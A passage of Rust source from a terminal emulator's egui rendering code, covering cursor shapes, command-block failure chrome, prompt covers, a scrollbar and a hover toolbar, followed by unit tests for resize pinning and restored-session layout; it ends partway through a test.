            let prev: Option<(f32, f32, usize)> = ctx.memory(|m| m.data.get_temp(mem_id));
            // Snap on big jumps (scroll/reset) AND on single-cell steps —
            // animating each keystroke's one-cell hop reads as typing lag.
            let snap = shift_moving
                || match prev {
                    Some((pxx, pyy, po)) => {
                        po != display_offset
                            || (x - pxx).abs() > 8.0 * cell_w
                            || (y - pyy).abs() > 8.0 * cell_h
                            || ((x - pxx).abs() <= 1.5 * cell_w && (y - pyy).abs() < 0.5 * cell_h)
                    }
                    None => true,
                };
            let dur = if snap { 0.0 } else { 0.07 };
            let ax = ctx.animate_value_with_time(widget_id.with("cur_x"), x, dur);
            let ay = ctx.animate_value_with_time(widget_id.with("cur_y"), y, dur);
            ctx.memory_mut(|m| m.data.insert_temp(mem_id, (x, y, display_offset)));
            if (ax - x).abs() > 0.3 || (ay - y).abs() > 0.3 {
                ctx.request_repaint();
            }
            let off = Vec2::new(px(ax) - x, px(ay) - y);
            let cell_rect =
                Rect::from_min_max(Pos2::new(x, y), Pos2::new(x_next, y_next)).translate(off);
            match (focused, cursor.shape) {
                (true, CursorShape::Block) => {
                    cursor_shapes.push(Shape::Rect(RectShape::filled(
                        cell_rect,
                        CornerRadius::ZERO,
                        cur_col,
                    )));
                    glyph_fg = global_bg; // invert glyph under the filled block
                }
                (true, CursorShape::Beam) => {
                    cursor_shapes.push(Shape::Rect(RectShape::filled(
                        Rect::from_min_max(
                            cell_rect.min,
                            Pos2::new(px(cell_rect.min.x + 2.0), cell_rect.max.y),
                        ),
                        CornerRadius::ZERO,
                        cur_col,
                    )));
                }
                (true, CursorShape::Underline) => {
                    cursor_shapes.push(Shape::Rect(RectShape::filled(
                        Rect::from_min_max(
                            Pos2::new(cell_rect.min.x, px(cell_rect.max.y - 2.0)),
                            cell_rect.max,
                        ),
                        CornerRadius::ZERO,
                        cur_col,
                    )));
                }
                // HollowBlock, or any shape while unfocused: outline only.
                _ => {
                    cursor_shapes.push(Shape::Rect(RectShape::stroke(
                        cell_rect,
                        CornerRadius::ZERO,
                        Stroke::new(1.0, cur_col),
                        StrokeKind::Inside,
                    )));
                }
            }
        }

        // SGR 8 conceal (Flags::HIDDEN): background/selection/cursor render,
        // the glyph and its decorations do not. Load-bearing for the seam
        // sentinel — the daemon serializer erases it structurally, but a
        // raw-tail replay (live-alt attach) delivers the concealed bytes to
        // the client parser verbatim, and an alt-closure fix in the journal
        // can leave that row on the PRIMARY grid (it used to hide inside
        // the never-exited alt region).
        if flags.contains(Flags::HIDDEN) {
            continue;
        }

        // Underline / strikethrough as crisp filled rects (T7).
        if flags.contains(Flags::UNDERLINE)
            || hovered_link.as_ref().is_some_and(|m| m.contains(&point))
        {
            let uy = px(y + cell_h - line_w - 1.0);
            deco_shapes.push(Shape::Rect(RectShape::filled(
                Rect::from_min_max(Pos2::new(x, uy), Pos2::new(x_next, uy + line_w)),
                CornerRadius::ZERO,
                glyph_fg,
            )));
        }
        if flags.contains(Flags::STRIKEOUT) {
            let sy = px(y + cell_h * 0.55);
            deco_shapes.push(Shape::Rect(RectShape::filled(
                Rect::from_min_max(Pos2::new(x, sy), Pos2::new(x_next, sy + line_w)),
                CornerRadius::ZERO,
                glyph_fg,
            )));
        }

        // Glyph via the per-glyph galley cache (left-aligned at cell origin).
        let ch = indexed.c;
        if ch != ' ' && ch != '\t' && ch != '\0' {
            let key = GlyphKey {
                ch,
                bold: flags.contains(Flags::BOLD),
                italic: flags.contains(Flags::ITALIC),
            };
            let galley = painter.fonts_mut(|f| glyphs.get(f, key));
            text_shapes.push(Shape::galley(Pos2::new(x, y), galley, glyph_fg));
        }
    }
    flush_run(&mut bg_run, bg_shapes);
    flush_run(&mut sel_run, sel_shapes);
    flush_run(&mut search_run, search_shapes);

    // ── Hover-reveal block bounds (seamless doctrine): a faint full-width
    // tint behind the hovered block's rows gives the floating toolbar its
    // context — structure by background shift, never by lines. Rides
    // bg_shapes: over the cell fills, under selection/text.
    if let Some(c) = chrome {
        let off = display_offset as i32;
        let y0 = px(origin.y + cell_h * (c.line + off) as f32).max(grid_rect.min.y);
        let y1 = px(origin.y + cell_h * (c.end_bound + off) as f32).min(grid_rect.max.y);
        if y1 > y0 {
            bg_shapes.push(Shape::Rect(RectShape::filled(
                Rect::from_min_max(
                    Pos2::new(grid_rect.min.x, y0),
                    Pos2::new(grid_rect.max.x, y1),
                ),
                CornerRadius::same(4),
                HOVER_TINT,
            )));
        }
    }

    // ── Journal-block chrome (P2): failure gutter + exit chips (signal, not
    // decoration — separators are gone; bounds reveal on hover only).
    // Drawn from the sorted anchor index — 2 binary searches + O(visible
    // blocks); the per-cell loop above gained zero work; shapes ride the
    // EXISTING vecs. `blocks` is Some only when blocks_active (hookless /
    // alt-screen / stale sessions never reach this).
    if let Some(bctx) = blocks {
        if let Some(feed) = backend.block_feed.as_ref() {
            let grid = backend.term.grid();
            let cursor_line = grid.cursor.point.line.0;
            let off = display_offset as i32;
            // Visible grid-line window, including the continuity-fill region.
            let lo = ((grid_rect.min.y - origin.y) / cell_h).floor() as i32 - off - 1;
            let hi = ((grid_rect.max.y - origin.y) / cell_h).ceil() as i32 - off + 1;
            let first = feed.anchors.partition_point(|a| a.line < lo);
            for i in first..feed.anchors.len() {
                let a = feed.anchors[i];
                if a.line > hi {
                    break;
                }
                // Join by start_off; a spoofed hook's orphan anchor matches
                // no record and draws nothing.
                let Ok(ri) = bctx
                    .recs
                    .binary_search_by_key(&a.start_off, |r| r.start_off)
                else {
                    continue;
                };
                let rec = &bctx.recs[ri];
                // Self-healing guard: `cls` (ED2) erases rows in place — an
                // anchor whose row is now blank would mark empty screen.
                if grid[GridLine(a.line)].line_length().0 == 0 {
                    continue;
                }
                // NO separator lines (seamless doctrine): at rest the prompt
                // lines themselves are the visual rhythm; a block's bounds
                // are revealed only on hover (tint below) and by the red
                // failure chrome. `sep_y` survives as the failure chrome's
                // top anchor.
                let sep_y = px(origin.y + cell_h * (a.line + off) as f32) - 0.5;
                // Failure chrome — completed failures only. Open blocks get
                // NOTHING (a live TUI may own those rows); success stays
                // completely quiet.
                let failed =
                    rec.end_off.is_some() && rec.exit.is_some_and(|e| e != 0);
                if failed {
                    let end_bound = a
                        .end_line
                        .or_else(|| feed.anchors.get(i + 1).map(|n| n.line))
                        .unwrap_or(cursor_line);
                    let y_end = px(origin.y + cell_h * (end_bound + off) as f32);
                    let gy0 = sep_y.max(grid_rect.min.y);
                    if y_end > gy0 {
                        let gx = grid_rect.min.x - PAD_L + 3.0;
                        bg_shapes.push(Shape::Rect(RectShape::filled(
                            Rect::from_min_max(
                                Pos2::new(gx, gy0),
                                Pos2::new(gx + 3.0, y_end),
                            ),
                            CornerRadius::ZERO,
                            DANGER_GUTTER,
                        )));
                    }
                    // Exit chip, riding ON the separator line (right-aligned,
                    // clear of the scrollbar lane).
                    let galley = painter.layout_no_wrap(
                        format!("exit {}", rec.exit.unwrap_or(0)),
                        FontId::proportional(10.0),
                        DANGER,
                    );
                    let cw = galley.size().x + 12.0;
                    let chh = 15.0;
                    let chip = Rect::from_min_max(
                        Pos2::new(grid_rect.max.x - 20.0 - cw, sep_y - chh / 2.0),
                        Pos2::new(grid_rect.max.x - 20.0, sep_y + chh / 2.0),
                    );
                    if chip.min.y >= grid_rect.min.y {
                        chip_shapes.push(Shape::Rect(RectShape::filled(
                            chip,
                            CornerRadius::same(4),
                            CHIP_BG,
                        )));
                        let gy = chip.center().y - galley.size().y / 2.0;
                        chip_shapes.push(Shape::galley(
                            Pos2::new(chip.min.x + 6.0, gy),
                            galley,
                            DANGER,
                        ));
                    }
                }
            }
        }
    }

    // Compose: bg → selection → search → cursor → decorations → text.
    // Overlay chrome (jump flash, exit chips, scrollbar, jump pill) is
    // painted AFTER the presentational covers below — covers paint the theme
    // background full-width over their rows, and anything already painted
    // there loses: half-eaten exit chips, a notched scrollbar thumb, gapped
    // hover tint (UX HIGH-2).
    painter.extend(
        bg_shapes
            .drain(..)
            .chain(sel_shapes.drain(..))
            .chain(search_shapes.drain(..))
            .chain(cursor_shapes.drain(..))
            .chain(deco_shapes.drain(..))
            .chain(text_shapes.drain(..)),
    );

    // Cover rows painted this frame (line, rect) — the hover-tint and
    // selection/search re-apply passes below need them.
    let mut covered_rows: Vec<(i32, Rect)> = Vec::new();
    let sel_range = backend
        .term
        .selection
        .as_ref()
        .and_then(|s| s.to_range(&backend.term));

    // ── Current-prompt cover (static-input architecture): paint the theme
    // background over the shell's latched prompt row — the grid is
    // content-only; the composer's strip editor is the one prompt, and the
    // grid cursor stays hidden under the blank. Painted after every grid
    // shape, so the prompt text AND the cursor underneath disappear.
    // Presentational only; gated hard by the caller (cover_line_for: armed
    // chain or SubmitHold pin — never blank on uncertainty). Rides
    // display_offset like every presentational cover — scrolling changes
    // nothing (the static input never moved anyway). Same y(line) formula as
    // the block chrome (single-formula doctrine).
    //
    // DISPLAY-STABLE under selection/search (§6): the cover stays painted;
    // the selection tint / search highlight composite OVER it below, and
    // copy synthesizes the displayed text (TermBackend::selection_text) —
    // covers never reveal the raw `PS …>` underneath (the rejected
    // "selection strips my prompt" design).
    let mut cover = None;
    if let Some(line) = cover_line {
        let off = display_offset as i32;
        let y = px(origin.y + cell_h * (line + off) as f32);
        if y + cell_h > grid_rect.min.y && y < grid_rect.max.y {
            let rect = Rect::from_min_max(
                Pos2::new(grid_rect.min.x, y),
                Pos2::new(grid_rect.max.x, px(y + cell_h)),
            );
            painter.rect_filled(rect, CornerRadius::ZERO, global_bg);
            covered_rows.push((line, rect));
            cover = Some(rect);
        }
    }

    // ── Composer presentational covers (P3 seamless): blank spacer rows (the
    // empty-Enter "more lines" gesture) and `❯ cmd` history covers over
    // composer-submitted rows, so the input surface never blinks through the
    // raw `PS …>` between prompts. Grid-line space from the backend
    // (stale-guarded + self-healed); mapped to screen rows here so they ride
    // display_offset (stay put while scrolling), INCLUDING the continuity-
    // fill region above the live screen (F9: a covered history row must not
    // float back to raw when the fill reveals it). Selection/search never
    // suppress (§6 — tints composite over, copy synthesizes). The
    // current-prompt cover row is skipped — it painted above. Healing runs
    // on the VISIBLE window only, by index — history covers are permanent
    // and accumulate; probing all of them every frame is O(day of work),
    // not O(screen) (UX MEDIUM-5).
    {
        let off = display_offset as i32;
        // Visible grid-line window (same formula family as block chrome),
        // extended upward into the continuity-fill region.
        let fill_rows = ((origin.y - grid_rect.min.y) / cell_h).ceil() as i32;
        let lo = -off - fill_rows - 1;
        let hi = ((grid_rect.max.y - origin.y) / cell_h).ceil() as i32 - off + 1;
        for i in backend.healthy_covers_in(lo, hi) {
            let Some(c) = backend
                .block_feed
                .as_ref()
                .and_then(|f| f.covers.get(i))
            else {
                continue;
            };
            if cover_line == Some(c.line) {
                continue; // the current-prompt cover owns this row
            }
            let y = px(origin.y + cell_h * (c.line + off) as f32);
            if y + cell_h <= grid_rect.min.y || y >= grid_rect.max.y {
                continue;
            }
            let rect = Rect::from_min_max(
                Pos2::new(grid_rect.min.x, y),
                Pos2::new(grid_rect.max.x, px(y + cell_h)),
            );
            painter.rect_filled(rect, CornerRadius::ZERO, global_bg);
            covered_rows.push((c.line, rect));
            if let Some(cmd) = &c.cmd {
                let x = super::composer::paint_prompt_prefix(
                    painter,
                    rect,
                    c.cwd.as_deref(),
                    &font,
                );
                let g = painter.layout_no_wrap(cmd.clone(), font.clone(), TEXT);
                painter.galley(
                    Pos2::new(x, rect.center().y - g.size().y / 2.0),
                    g,
                    TEXT,
                );
            }
        }
    }

    // ── Display-stable selection/search over covers (§6): re-apply the
    // tints the cover backgrounds just erased, in main-pass geometry —
    // selection as the exact column span (full width on interior lines),
    // search as a full-row wash (cell-accurate rects would advertise raw
    // column positions that mean nothing against the painted galleys).
    // Copy matches via TermBackend::selection_text's synthesis.
    for (line, rect) in &covered_rows {
        if let Some(r) = sel_range {
            if *line >= r.start.line.0 && *line <= r.end.line.0 {
                let cols = backend.size.cols as f32;
                let c0 = if *line == r.start.line.0 { r.start.column.0 as f32 } else { 0.0 };
                let c1 = if *line == r.end.line.0 {
                    (r.end.column.0 + 1) as f32
                } else {
                    cols
                };
                let x0 = px(origin.x + cell_w * c0).max(rect.min.x);
                let x1 = px(origin.x + cell_w * c1).min(rect.max.x);
                if x1 > x0 {
                    painter.rect_filled(
                        Rect::from_min_max(Pos2::new(x0, rect.min.y), Pos2::new(x1, rect.max.y)),
                        CornerRadius::ZERO,
                        SEL_OVERLAY,
                    );
                }
            }
        }
        if search_by_line.contains_key(line) {
            let cur = current_match
                .as_ref()
                .is_some_and(|m| *line >= m.start().line.0 && *line <= m.end().line.0);
            painter.rect_filled(
                *rect,
                CornerRadius::ZERO,
                if cur { SEARCH_CURRENT } else { SEARCH_HL },
            );
        }
    }

    // ── Overlay chrome, painted OVER the covers (UX HIGH-2). Order: hover
    // tint patches → jump flash → exit chips → scrollbar → jump pill; the
    // hover toolbar stays last.

    // Hover-tint re-apply on covered rows: the tint band rode bg_shapes and
    // was erased wherever a cover painted — patch those rows so a hovered
    // block's bounds read continuously (the tint is translucent; over the
    // cover's text at alpha 7 it is imperceptible).
    if let Some(c) = chrome {
        for (line, rect) in &covered_rows {
            if *line >= c.line && *line < c.end_bound {
                painter.rect_filled(*rect, CornerRadius::ZERO, HOVER_TINT);
            }
        }
    }

    // ── Block jump flash (P2): translucent accent over the jumped block's
    // first two rows, alpha 1→0 over 0.5s. Repaints ride
    // animate_value_with_time — never a bare request_repaint. After covers:
    // a covered anchor row must flash like any other.
    if blocks.is_some() {
        if let Some((f_off, t0)) = backend.jump_flash {
            let anchor_line = backend
                .block_feed
                .as_ref()
                .and_then(|f| {
                    f.anchors
                        .binary_search_by_key(&f_off, |a| a.start_off)
                        .ok()
                        .map(|i| f.anchors[i].line)
                });
            if t0.elapsed().as_secs_f32() > 0.6 || anchor_line.is_none() {
                backend.jump_flash = None;
            } else if let Some(line) = anchor_line {
                let ctx = painter.ctx();
                let fid = widget_id.with("blk_flash");
                if vs.flash_seen != Some(t0) {
                    vs.flash_seen = Some(t0);
                    ctx.animate_value_with_time(fid, 1.0, 0.0); // snap to full
                }
                let alpha = ctx.animate_value_with_time(fid, 0.0, 0.5);
                if alpha > 0.02 {
                    let y = px(origin.y + cell_h * (line + display_offset as i32) as f32);
                    painter.rect_filled(
                        Rect::from_min_max(
                            Pos2::new(grid_rect.min.x, y),
                            Pos2::new(grid_rect.max.x, y + 2.0 * cell_h),
                        ),
                        CornerRadius::ZERO,
                        ACCENT_SUBTLE.gamma_multiply(alpha),
                    );
                }
            }
        }
    }

    // Exit chips (signal chrome — must win over covers).
    painter.extend(chip_shapes.drain(..));

    // Floating scrollbar (T9): thin overlay on the grid's right edge. Same
    // geometry as the process_input hit-test (UX MEDIUM-7: the widened thumb
    // is grabbable, press-in-lane jumps, drag scrolls). Painted after the
    // covers so the thumb is never notched.
    if let Some(geom) = ScrollbarGeom::compute(backend, grid_rect) {
        let near = vs.scrollbar_drag.is_some()
            || painter
                .ctx()
                .pointer_latest_pos()
                .is_some_and(|p| (grid_rect.max.x - p.x).abs() <= 16.0 && grid_rect.y_range().contains(p.y));
        let w = if near { 8.0 } else { 4.0 };
        let thumb = geom.thumb(grid_rect, display_offset, w);
        painter.rect_filled(
            thumb,
            CornerRadius::same((w / 2.0) as u8),
            Color32::from_rgba_unmultiplied(255, 255, 255, 41),
        );
    }

    // Jump-to-bottom pill (T9 / D33) replaces the old "N lines back" box.
    // Depth by shadow alone — no border stroke (seamless doctrine).
    if display_offset > 0 {
        let pill = jump_pill_rect(grid_rect);
        let shadow = egui::epaint::Shadow {
            offset: [0, 4],
            blur: 16,
            spread: 0,
            color: Color32::from_black_alpha(120),
        };
        let mut pill_shapes: Vec<Shape> = Vec::new();
        pill_shapes.push(Shape::Rect(shadow.as_shape(pill, CornerRadius::same(12))));
        pill_shapes.push(Shape::Rect(RectShape::filled(
            pill,
            CornerRadius::same(12),
            SURFACE_2,
        )));
        // Down chevron.
        let cy = pill.center().y;
        let cx = pill.min.x + 18.0;
        painter_chevron_down(&mut pill_shapes, Pos2::new(cx, cy), TEXT_SECONDARY);
        let galley = painter.layout_no_wrap(
            "Jump to bottom".into(),
            FontId::proportional(11.0),
            TEXT_SECONDARY,
        );
        let gy = pill.center().y - galley.size().y / 2.0;
        pill_shapes.push(Shape::galley(
            Pos2::new(cx + 12.0, gy),
            galley,
            TEXT_SECONDARY,
        ));
        painter.extend(pill_shapes);
    }

    // ── Block hover toolbar (P2): painted LAST so it floats above text like
    // the jump pill. Exists only under the pointer, so transient occlusion
    // of one text row is acceptable and standard.
    if let Some(c) = chrome {
        let pill = c.toolbar;
        let shadow = egui::epaint::Shadow {
            offset: [0, 4],
            blur: 16,
            spread: 0,
            color: Color32::from_black_alpha(120),
        };
        painter.add(Shape::Rect(shadow.as_shape(pill, CornerRadius::same(6))));
        // Depth by shadow alone — no border stroke (seamless doctrine).
        painter.add(Shape::Rect(RectShape::filled(
            pill,
            CornerRadius::same(6),
            SURFACE_2,
        )));
        let cap = painter.layout_no_wrap(
            c.caption.clone(),
            FontId::proportional(11.0),
            TEXT_SECONDARY,
        );
        let cap_y = pill.center().y - cap.size().y / 2.0;
        painter.galley(Pos2::new(pill.min.x + 10.0, cap_y), cap, TEXT_SECONDARY);

        let pointer = painter.ctx().pointer_latest_pos();
        let now = painter.ctx().input(|i| i.time);
        let mut hovered_btn: Option<usize> = None;
        for (i, (r, btn)) in c.btns.iter().enumerate() {
            let over = pointer.is_some_and(|p| r.contains(p));
            if over {
                hovered_btn = Some(i);
                painter.rect_filled(*r, CornerRadius::same(4), OV_HOVER);
            }
            let col = match btn {
                BlockBtn::Rerun if !c.rerun_enabled => TEXT_FAINT, // visibly disabled, still discoverable
                _ if over => TEXT,
                _ => TEXT_SECONDARY,
            };
            let icon = match btn {
                BlockBtn::CopyCmd => super::Icon::Copy,
                BlockBtn::CopyOutput => super::Icon::CopyLines,
                BlockBtn::Rerun => super::Icon::Rerun,
                BlockBtn::Jump => super::Icon::ChevronUp,
            };
            super::draw_icon(painter, r.shrink(3.0), icon, col);
        }
        // Dwell tooltip (0.3s) — manual: egui 0.35 dropped show_tooltip_at,
        // and a real tooltip widget would join egui's hit-test order which
        // this chrome deliberately bypasses.
        match hovered_btn {
            Some(i) => {
                let t0 = match vs.tip {
                    Some((ti, t0)) if ti == i as u8 => t0,
                    _ => {
                        vs.tip = Some((i as u8, now));
                        now
                    }
                };
                if now - t0 > 0.3 {
                    let label = match c.btns[i].1 {
                        BlockBtn::CopyCmd => "Copy command",
                        BlockBtn::CopyOutput => "Copy output",
                        BlockBtn::Rerun => {
                            if c.rerun_enabled {
                                "Run again"
                            } else {
                                "Shell is busy"
                            }
                        }
                        BlockBtn::Jump => "Jump to start",
                    };
                    let g = painter.layout_no_wrap(
                        label.into(),
                        FontId::proportional(11.0),
                        TEXT,
                    );
                    let br = c.btns[i].0;
                    let tw = g.size().x + 12.0;
                    let tip = Rect::from_min_size(
                        Pos2::new(
                            (br.center().x - tw / 2.0)
                                .min(grid_rect.max.x - tw - 4.0)
                                .max(grid_rect.min.x + 4.0),
                            br.max.y + 6.0,
                        ),
                        Vec2::new(tw, 20.0),
                    );
                    painter.rect_filled(tip, CornerRadius::same(4), SURFACE_3);
                    painter.galley(
                        Pos2::new(tip.min.x + 6.0, tip.center().y - g.size().y / 2.0),
                        g,
                        TEXT,
                    );
                }
            }
            None => vs.tip = None,
        }
    }

    cover
}

/// A small down-pointing chevron built from two line segments.
fn painter_chevron_down(shapes: &mut Vec<Shape>, center: Pos2, color: Color32) {
    let s = 4.0;
    let stroke = Stroke::new(1.5, color);
    shapes.push(Shape::line_segment(
        [center + Vec2::new(-s, -s * 0.5), center + Vec2::new(0.0, s * 0.5)],
        stroke,
    ));
    shapes.push(Shape::line_segment(
        [center + Vec2::new(0.0, s * 0.5), center + Vec2::new(s, -s * 0.5)],
        stroke,
    ));
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::gui::term_backend::GridSize;

    const CELL_W: f32 = 8.0;
    const CELL_H: f32 = 16.0;

    fn backend_with_lines(rows: u16, lines: usize) -> TermBackend {
        let mut b = TermBackend::new(GridSize {
            cols: 80,
            rows,
            cell_width: CELL_W,
            cell_height: CELL_H,
        });
        for i in 0..lines {
            b.advance(format!("line {i}\r\n").as_bytes());
        }
        b
    }

    /// R4-F2: the AltGr-synthesis polarity table. `true` must cover exactly
    /// the Ctrl+Alt shapes (Windows reports AltGr as Ctrl+Alt) so the
    /// Copy/Cut/Paste arms drop the bogus synthesized event; every real
    /// clipboard chord stays `false` (plain Ctrl+C/X/V, Ctrl+Shift variants,
    /// Ctrl+Insert / Shift+Insert / Shift+Delete synthesis — no alt).
    #[test]
    fn altgr_synthesized_polarity_table() {
        use egui::Modifiers;
        let m = |alt: bool, ctrl: bool, shift: bool| Modifiers {
            alt,
            ctrl,
            shift,
            mac_cmd: false,
            command: ctrl, // egui mirrors ctrl into command on Windows
        };
        // AltGr shapes ⇒ suppress.
        assert!(altgr_synthesized(m(true, true, false)), "AltGr (ctrl+alt)");
        assert!(altgr_synthesized(m(true, true, true)), "AltGr+Shift");
        // Real clipboard chords ⇒ keep.
        assert!(!altgr_synthesized(m(false, true, false)), "plain Ctrl+C/X/V");
        assert!(!altgr_synthesized(m(false, true, true)), "Ctrl+Shift variants");
        assert!(!altgr_synthesized(m(false, false, true)), "Shift+Insert/Delete");
        assert!(!altgr_synthesized(m(true, false, false)), "plain Alt is not AltGr");
        assert!(!altgr_synthesized(Modifiers::NONE));
    }

    /// Bottom-pin is the ONE anchor mode (design revision): a sparse restored
    /// view always wants a continuity fill — hooked terminals included.
    #[test]
    fn restored_view_always_bottom_pins() {
        let mut b = backend_with_lines(24, 40); // builds scrollback history
        b.advance(b"\x1b[5;1H\x1b[J"); // cursor row 4, erase below ⇒ blank tail
        let avail = 24.0 * CELL_H;
        let fill = content_y_offset(&b, avail, None);
        assert!(fill > 0.0, "a sparse restored view wants a continuity fill (got {fill})");
    }

    /// On-screen y of the cursor row when rendered into a viewport of
    /// `avail_h` px, including the transient content shift.
    fn cursor_y(b: &TermBackend, avail_h: f32) -> f32 {
        content_y_offset(b, avail_h, None)
            + b.term.grid().cursor.point.line.0 as f32 * CELL_H
    }

    /// The core invariant: the throttled resize commit must land with no
    /// visible movement — the cursor row renders at the same pixel before
    /// (shifted, stale grid) and after (recomputed, resized grid).
    fn assert_no_jump(mut b: TermBackend, avail_h: f32) {
        let before = cursor_y(&b, avail_h);
        b.resize_to(egui::vec2(80.0 * CELL_W, avail_h), egui::vec2(CELL_W, CELL_H));
        let after = cursor_y(&b, avail_h);
        assert!(
            (before - after).abs() < 0.01,
            "commit moved content: cursor row at {before}px pre-commit, {after}px post-commit"
        );
    }

    #[test]
    fn grow_with_deep_history_stays_bottom_flush() {
        let b = backend_with_lines(30, 100); // history ≫ growth
        let avail = 30.0 * CELL_H + 91.0; // +5 rows and a sub-cell remainder
        assert_eq!(content_y_offset(&b, avail, None), 91.0, "full slack absorbed on top");
        assert_no_jump(b, avail);
    }

    /// Bottom-pin holds even when scrollback can't fill the vacated space
    /// (the restore-void fix): the old `min(history_px)` cap top-anchored
    /// exactly these grids, and with the composer cover blanking the prompt
    /// row the field render was banner-at-top / screen-sized void / strip at
    /// the bottom. Shallow history changes WHERE the empty space renders
    /// (above the content), never whether the content pins to the bottom.
    #[test]
    fn grow_with_shallow_history_still_bottom_pins() {
        let b = backend_with_lines(30, 32); // little scrollback
        let history_px = b.term.grid().history_size() as f32 * CELL_H;
        let avail = 30.0 * CELL_H + 91.0;
        assert!(history_px < 91.0, "test needs history smaller than the slack");
        assert_eq!(
            content_y_offset(&b, avail, None),
            91.0,
            "full slack absorbed above the content — no history cap"
        );
        assert_no_jump(b, avail);
    }

    #[test]
    fn grow_fresh_terminal_bottom_pins_too() {
        let b = backend_with_lines(30, 3); // no scrollback at all
        let avail = 30.0 * CELL_H + 91.0;
        let cur = b.term.grid().cursor.point.line.0;
        let blank_tail = 30 - 1 - cur; // rows below the cursor are blank
        assert_eq!(
            content_y_offset(&b, avail, None),
            91.0 + blank_tail as f32 * CELL_H,
            "one anchor mode: a fresh terminal pins to the bottom edge too"
        );
        assert_no_jump(b, avail);
    }

    #[test]
    fn shrink_full_screen_keeps_prompt_flush_with_bottom() {
        let b = backend_with_lines(30, 100); // cursor on the last row
        let avail = 30.0 * CELL_H - 73.0; // -4 rows and change
        assert_eq!(content_y_offset(&b, avail, None), -73.0, "content pinned to the bottom edge");
        assert_no_jump(b, avail);
    }

    /// Shrink with a high cursor: the blank rows under the cursor are dead
    /// space the commit will clip — the unified pin puts the cursor row at
    /// the viewport bottom BEFORE the commit too (the old early-return
    /// top-anchored this shape, then the commit snapped it down: a jump).
    #[test]
    fn shrink_with_high_cursor_pins_cursor_to_bottom() {
        let b = backend_with_lines(30, 3); // cursor near the top, blanks below
        let avail = 20.0 * CELL_H; // shrink well below the old grid
        let cur = b.term.grid().cursor.point.line.0 as f32;
        assert_eq!(
            content_y_offset(&b, avail, None),
            avail - (cur + 1.0) * CELL_H,
            "cursor row pinned to the shrunk viewport's bottom edge"
        );
        assert_no_jump(b, avail);
    }

    /// Bottom-pin honesty at the conhost resize-repaint shape ([H prompt +
    /// [K-erased rows + cursor home): every row below the cursor is visually
    /// dead space, so the fill must cover ALL of them — the armed prompt
    /// sits flush above the strip with no dead rows beneath (given enough
    /// history to supply the shift).
    #[test]
    fn conhost_repaint_prompt_pins_flush_to_bottom() {
        let mut b = backend_with_lines(24, 60); // plenty of history
        b.advance(b"\x1b[HPS> \x1b[K");
        for _ in 0..23 {
            b.advance(b"\r\n\x1b[K");
        }
        b.advance(b"\x1b[1;6H"); // cursor back onto the prompt row
        let avail = 24.0 * CELL_H;
        assert_eq!(
            content_y_offset(&b, avail, None),
            23.0 * CELL_H,
            "all [K-erased rows below the prompt are dead space the fill covers"
        );
    }

    /// THE field restore-void regression (2026-07-06 screenshots, terminal
    /// "Shell · alice 2"): a restored PS session whose journal dedupe
    /// (correctly) left ~zero scrollback — banner at rows 0..=3, covered
    /// prompt at row 5, blank tail below. The old history-capped fill
    /// rendered it banner-at-TOP with a screen-sized void between the banner
    /// and the composer strip. The fill must retire the covered prompt row,
    /// its pre-prompt blank, and the whole blank tail regardless of history,
    /// pinning the banner flush above the strip.
    #[test]
    fn restored_banner_only_session_pins_banner_above_strip() {
        let mut b = backend_with_lines(24, 0); // fresh grid, zero history
        b.advance(
            b"Windows PowerShell\r\n\
              Copyright (C) Microsoft Corporation. All rights reserved.\r\n\r\n\
              Install the latest PowerShell for new features and improvements!\r\n\r\n\
              PS C:\\Users\\alice> ",
        );
        let cur = b.term.grid().cursor.point.line.0;
        assert_eq!(cur, 5, "prompt row under the banner");
        assert_eq!(b.term.grid().history_size(), 0, "dedupe left no scrollback");
        let avail = 24.0 * CELL_H;
        // Below-cursor blanks (18) + the covered prompt row + its one
        // pre-prompt blank = 20 rows of dead space the fill must cover.
        assert_eq!(
            content_y_offset(&b, avail, Some(cur)),
            20.0 * CELL_H,
            "banner pins flush above the strip — no void between content and prompt"
        );
        // Without the cover the raw prompt row stays visible (honest gap
        // below it still retires).
        assert_eq!(content_y_offset(&b, avail, None), 18.0 * CELL_H);
    }

    /// The ssh twin of the field bug (terminal "192.0.2.14 3"): the whole
    /// session is ONE bare covered prompt (journal held only bare prompts —
    /// nothing was eaten; there was nothing to keep). The grid must retire
    /// completely: an empty card with the strip as the one prompt, not a
    /// full-viewport "blank region where content should be".
    #[test]
    fn restored_prompt_only_session_retires_fully() {
        let mut b = backend_with_lines(24, 0);
        b.advance(b"alice@edgebox:~$ ");
        let cur = b.term.grid().cursor.point.line.0;
        assert_eq!(cur, 0);
        let avail = 24.0 * CELL_H;
        assert_eq!(
            content_y_offset(&b, avail, Some(cur)),
            24.0 * CELL_H,
            "covered bare prompt + blank screen = fully retired grid"
        );
    }

    /// The alt-screen gate must be EXPLICIT now that the history cap is
    /// gone: the cap used to zero the shift by accident (alt grid has no
    /// scrollback). A TUI frame with a blank tail must never shift.
    #[test]
    fn alt_screen_never_shifts() {
        let mut b = backend_with_lines(24, 40); // real primary scrollback
        b.advance(b"\x1b[?1049h\x1b[HTUI HEADER\r\n"); // alt screen, blanks below
        assert!(b.mode().contains(TermMode::ALT_SCREEN));
        let avail = 24.0 * CELL_H + 91.0; // even with resize slack
        assert_eq!(
            content_y_offset(&b, avail, None),
            0.0,
            "TUIs own their absolute layout — never shifted"
        );
    }

    #[test]
    fn steady_state_remainder_is_absorbed_above_scrolled_content() {
        let b = backend_with_lines(30, 100);
        let avail = 30.0 * CELL_H + 9.0; // grid committed; sub-cell remainder only
        assert_eq!(content_y_offset(&b, avail, None), 9.0, "bottom row flush against the pad");
    }

    /// THE user's gap acceptance case (field screenshot: ~6 blank rows
    /// between the ls tail and the input lane): with the current-prompt
    /// cover granted, the blanked prompt row AND the shell's own pre-prompt
    /// blank rows collapse into the fill — the last output row pins flush
    /// above the strip. Without the cover (raw prompt) the honest gap stays.
    #[test]
    fn covered_prompt_collapses_pre_prompt_blanks() {
        let mut b = backend_with_lines(24, 60); // plenty of history
        // ls tail + Format-Table blank + PS blank + prompt (cursor row).
        b.advance(b"Cargo.toml\r\n\r\n\r\nPS C:\\> ");
        let cur = b.term.grid().cursor.point.line.0;
        let avail = 24.0 * CELL_H;
        let base = content_y_offset(&b, avail, None);
        let covered = content_y_offset(&b, avail, Some(cur));
        assert_eq!(
            covered - base,
            3.0 * CELL_H,
            "cover granted ⇒ prompt row + the 2 pre-prompt blanks join the fill"
        );
        // Content below the cursor (rare, honest) blocks the extension:
        // cursor repositioned mid-screen with real rows underneath.
